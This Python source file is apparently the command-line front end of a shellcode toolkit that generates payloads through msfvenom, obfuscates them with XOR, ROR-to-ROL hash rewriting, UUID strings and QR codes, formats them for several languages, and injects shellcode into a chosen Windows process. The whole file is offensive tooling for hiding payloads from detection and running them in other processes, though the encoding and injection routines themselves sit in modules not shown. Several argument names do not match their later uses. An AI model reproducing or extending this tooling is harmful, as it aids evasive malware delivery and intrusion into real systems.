"""
- Fix: cs output, missing "," at EOL (assist)
"""

import argparse
import os

import utils.arguments as arguments
import utils.assist as assist
import utils.msf as msf
import utils.obfuscating as obf
import utils.shellcode as sc
import utils.stub as stub

Version = '0.4.4'

if os.name == 'nt':
# make sure your metasploit binary folder is in your PATH variable
  msfvenom_path = "msfvenom.bat"
elif os.name == 'posix':
  msfvenom_path = 'msfvenom'
  
dll_paths = ['C:\\Windows\\System32\\kernel32.dll', 
             'C:\\Windows\\System32\\ws2_32.dll', 
             'C:\\Windows\\System32\\wininet.dll', 
             'C:\\Windows\\System32\\dnsapi.dll',
             'C:\\Windows\\System32\\mswsock.dll']

class nstate:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m[*]\033[0m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m[+]\033[0m'
    WARNING = '\033[93m'
    FAIL = '\033[91m[-]\033[0m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    LINK = '\033[94m\033[4m'

def main(command_line=None):
  print(f"{nstate.HEADER}")
  print(f"  _______   __                      _______              __         ")
  print(f" |   _   | |  |--. .-----. .-----. |   _   | .-----. .--|  | .-----.")
  print(f" |   1___| |     | |  -__| |     | |.  1___| |  _  | |  _  | |  -__|")
  print(f" |____   | |__|__| |_____| |__|__| |.  |___  |_____| |_____| |_____|")
  print(f" |:  1   |                         |:  1   |                        ")
  print(f" |::.. . |                         |::.. . |                        ")
  print(f" `-------\'                         `-------\'                      ")
  print(f"Version {Version} by psycore8 -{nstate.ENDC} {nstate.LINK}https://www.nosociety.de{nstate.ENDC}")
  # print(f'{command_line}')
  # ap = arguments.parser()
  # ap.parser_add() 
  parser = argparse.ArgumentParser(description="create and obfuscate shellcodes")
  parser.add_argument("-o", "--output", choices=["c","casm","cs","ps1","py","hex","inspect"], help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
  subparsers = parser.add_subparsers(dest='command')
  parser_create = subparsers.add_parser("create", help="create a shellcode")
  # parser_create.add_argument("-p", "--payload", help="payload to use e.g. windows/shell_reverse_tcp")
  # parser_create.add_argument("-lh", "--lhost", help="LHOST Argument")
  # parser_create.add_argument("-lp", "--lport", help="LPORT Argument")
  parser_create.add_argument("-c", "--msf-cmd", type=str, help="msfvenom command line, use quotation marks and equal sign e.g --cmd=\"-p ...\"")
  parser_create.add_argument('-x', '--xor-stub', action='store_true', help='create payload from a raw file, encode with xor, add to xor stub')
  parser_create.add_argument('-f','--xor-filename',help='Input file to use with xor stub')
  parser_create.add_argument('-o', '--xor-outputfile', help='outputfile for xor stub')
  parser_create.add_argument('-k', '--xor-key', help='the XOR key to use')
  parser_encode = subparsers.add_parser("encode", help="encode windows function hashes to ROL")
  parser_encode.add_argument("-f", "--filename", help="raw input file with shellcode")
  parser_encode.add_argument("-o", "--outputfile", help="raw input file with shellcode")
  if os.name == 'nt':
    parser_encode.add_argument("-r", "--ror2rol", action="store_true", help="change ROR13 to ROL encoding")
    parser_encode.add_argument("-rk", "--key", help="ROL key for encoding")
  parser_encode.add_argument("-x", "--xor",   action="store_true", help="use additional XOR encoding")
  parser_encode.add_argument("-xk", "--xorkey", help="XOR key for encoding")
  parser_encode.add_argument("-q", "--qrcode",   action="store_true", help="store your payload in QR Code picture")
  parser_encode.add_argument("-u", "--uuid",   action="store_true", help="Obfuscate Shellcode as UUID")
  parser_encode = subparsers.add_parser("extract", help="extract shellcode from/to pattern")
  parser_encode.add_argument("-f", "--filename", help="inputfile")
  parser_encode.add_argument("-o", "--outputfile", help="outputfile")
  parser_encode.add_argument("-fb", "--first-byte", help="extract from here")
  parser_encode.add_argument("-lb", "--last-byte", help="extract until here")
  if os.name == 'nt':
    parser_inject = subparsers.add_parser("inject", help="inject shellcode")
    parser_inject.add_argument("-f", "--filename", help="raw input file with shellcode to inject")
    parser_inject.add_argument("-p", "--processname", help="raw input file with shellcode to inject")
    parser_inject.add_argument("-s", "--startprocess", action="store_true", help="raw input file with shellcode to inject")
  parser_output = subparsers.add_parser("output", help="create formatted output by filename")
  parser_output.add_argument("-f", "--filename", help="raw input file with shellcode")
  parser_output.add_argument("-s", "--syntax", help="formatting the shellcode in C, Casm, C#, Powershell, python or hex")
  parser_output.add_argument("-l", "--lines", action="store_true", help="adds a line numbering after each 8 bytes")
  parser_output.add_argument("-w", "--write", help="write output to the given filename (replacing $%BUFFER%$ placeholder in the file")
  
  args = parser.parse_args(command_line)
  # OutputFormat = arguments.parser.args.output
  OutputFormat = args.output
  
  if args.command == "create":
    if args.cmd:
      print(f'{args.cmd}')
      print(f"{nstate.OKBLUE} create payload")
      cs = msf.msfvenom
      cs.CreateShellcodeEx(msfvenom_path, args.cmd)
    elif args.xor_stub:
      stub.xor.Input_File = args.filename
      stub.xor.XOR_Key = args.xor_key
      stub.xor.Output_File = args.outputfile
      stub.xor.Template_File = 'tpl\\xor-stub.tpl'
      xor = sc.xor
      print(f"{nstate.OKBLUE} Reading shellcode")
      try: 
        with open(args.filename, "rb") as file:
          shellcode = file.read()
      except FileNotFoundError:
          print(f"{nstate.FAIL} File not found or cannot be opened.")
          exit()
      modified_shellcode = xor.xor_crypt_bytes(shellcode, int(args.xor_key))
      outputfile = 'xor.tmp'
      with open(outputfile, 'wb') as file:
        file.write(modified_shellcode)
      path = outputfile
      cf = os.path.isfile(path)
      if cf == True:
        print(f"{nstate.OKGREEN} XOR encoded shellcode created in {outputfile}")
      else:
        print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
        exit()
      stub.xor.Input_File = outputfile
      stub.xor.process()


  elif args.command == "encode":
    filename = args.filename
    out_file = args.outputfile

    if args.ror2rol:
      ror_key = int(args.key)
      if (ror_key < 32) or (ror_key > 255):
        print(f"{nstate.FAIL} Key must be between 33 and 255")
        exit()
      ror2rol = sc.ror2rol
      ror2rol.process(dll_paths, filename, out_file, args.key)

    if args.xor:
      xor = sc.xor
      print(f"{nstate.OKBLUE} Reading shellcode")
      try: 
        with open(filename, "rb") as file:
          shellcode = file.read()
      except FileNotFoundError:
          print(f"{nstate.FAIL} File not found or cannot be opened.")
          exit()
      modified_shellcode = xor.xor_crypt_bytes(shellcode, int(args.xorkey))
      outputfile = out_file
      with open(outputfile, 'wb') as file:
        file.write(modified_shellcode)
      path = outputfile
      cf = os.path.isfile(path)
      if cf == True:
        print(f"{nstate.OKGREEN} XOR encoded shellcode created in {outputfile}")
      else:
        print(f"{nstate.FAIL} XOR encoded Shellcode error, aborting script execution")
        exit()

    if args.uuid:
      short_fn = os.path.basename(filename)
      ou = obf.obf_uuid
      print(f"{nstate.OKBLUE} try to open file")
      if ou.open_file(filename):
        print(f"{nstate.OKGREEN} reading {short_fn} successful!")
      else:
        print(f"{nstate.FAIL} file not found, exit")
      print(f"{nstate.OKBLUE} try to generate UUIDs")  
      print(ou.CreateVar())

    if args.qrcode:
      short_fn = os.path.basename(filename)
      oq = obf.obf_qrcode
      if oq.open_file(filename):
        print(f'{nstate.OKGREEN} reading {short_fn} successful!')
      else:
        print(f'{nstate.FAIL} file not found, exit')
      oq.SetOutputFile(out_file)
      # if not oq.SetOutputFile(out_file):
      #   print(f"{nstate.FAIL} output Filename was not set --> {obf.obf_qrcode.OutputFilename}") 
      #   exit()
      # else:
      #   print(f"{nstate.OKGREEN} filename was set to {obf.obf_qrcode.OutputFilename}") 
      print(f'Shellcode Size: {len(obf.obf_qrcode.Shellcode)}')
      #print(f'Output: {obf.obf_qrcode.Out_File}')
      oq.process()
      path = out_file
      cf = os.path.isfile(path)
      if cf == True:
        print(f'{nstate.OKGREEN} QR-Code creation successful: {out_file}')
      else:
        print(f'{nstate.FAIL} error creating QR-Code')
        exit()

  elif args.command == "extract":
    if args.outputfile == "":
      print(f"{nstate.FAIL} please provide an output filename!")
      exit()
    print(f"{nstate.OKBLUE} try to open file")
    filename = args.filename
    short_fn = os.path.basename(filename)
    try:
      with open(filename, "rb") as file:
        shellcode = file.read()
        print(f"{nstate.OKGREEN} reading {short_fn} successful!")
    except FileNotFoundError:
      print(f"{nstate.FAIL} file not found, exit")
      exit()
    print(f"{nstate.OKBLUE} cutting shellcode from {args.first_byte} to {args.last_byte}")
    shellcode_new = shellcode[int(args.first_byte):int(args.last_byte)]
    with open(args.outputfile, 'wb') as file:
      file.write(shellcode_new)
    path = args.outputfile
    cf = os.path.isfile(path)
    short_fn = os.path.basename(args.outputfile)
    if cf == True:
      print(f"{nstate.OKGREEN} written shellcode to {short_fn}")
    else:
      print(f"{nstate.OKFAIL} error while writing")
      exit()


  elif args.command == "inject":
    print(f"{nstate.OKBLUE} Reading shellcode")
    filename = args.filename
    try: 
      with open(filename, "rb") as file:
        shellcode = file.read()
    except FileNotFoundError:
        print(f"{nstate.FAIL} File not found or cannot be opened.")
        exit()
    inject = sc.inject
    inject.Shellcode = shellcode
    inject.StartProcess = args.startprocess
    inject.Target_Process = args.processname
    inject.start_injection()

  if args.output or args.command == 'output':
   if args.command == 'output':
     filename = args.filename
     OutputFormat = args.syntax
     lines = args.lines
   print(filename)
   print(f"{nstate.OKBLUE} processing shellcode format...")
   b2s = assist.bin2sc
   scFormat = b2s.process(filename,OutputFormat,lines)
   print(scFormat)
   if args.write:
     assist.FileManipulation.WriteToTemplate(args.write, scFormat)
     print(f"{nstate.OKGREEN} Output written in buf {args.write}")
  print(f"{nstate.OKGREEN} DONE!")

if __name__ == "__main__":
  main()
